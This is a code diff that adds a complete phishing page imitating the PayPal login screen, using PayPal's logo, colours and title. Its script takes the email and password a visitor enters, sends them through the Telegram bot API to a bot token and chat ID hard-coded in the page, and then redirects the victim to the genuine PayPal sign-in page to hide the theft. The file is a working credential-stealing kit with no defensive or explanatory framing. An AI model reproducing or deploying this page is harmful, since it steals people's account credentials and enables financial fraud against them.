@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to your PayPal account</title>
+    <style>
+        body { font-family: "PayPalSansSmall-Regular", "Helvetica Neue", Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; }
+        .container { max-width: 400px; margin: 50px auto; padding: 30px; border: 1px solid #ddd; border-radius: 15px; text-align: center; }
+        .logo { margin-bottom: 30px; }
+        input { width: 90%; padding: 15px; margin-bottom: 15px; border: 1px solid #a6a6a6; border-radius: 5px; font-size: 16px; }
+        button { width: 100%; background: #0070ba; color: white; border: none; padding: 15px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #005ea6; }
+        .footer { margin-top: 50px; font-size: 12px; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" width="100">
+        </div>
+        <div id="login-form">
+            <input type="text" id="email" placeholder="Email or mobile number">
+            <input type="password" id="password" placeholder="Password">
+            <button onclick="sendPayPalData()">Log In</button>
+        </div>
+    </div>
+
+    <script>
+        function sendPayPalData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            const token = '8661414644:AAEOXANSWUA3sIrP9_Ta4Id9DC3HPN5ugvc';
+            const chatId = '8353285510'; 
+
+            const message = `💰 Notun PayPal Data! \n\n📧 Email: ${email} \n🔑 Pass: ${pass}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url).then(() => {
+                // Redirecting to real PayPal login
+                window.location.href = "https://www.paypal.com/signin";
+            }).catch(() => {
+                window.location.href = "https://www.paypal.com/signin";
+            });
+        }
+    </script>
+</body>
+</html>
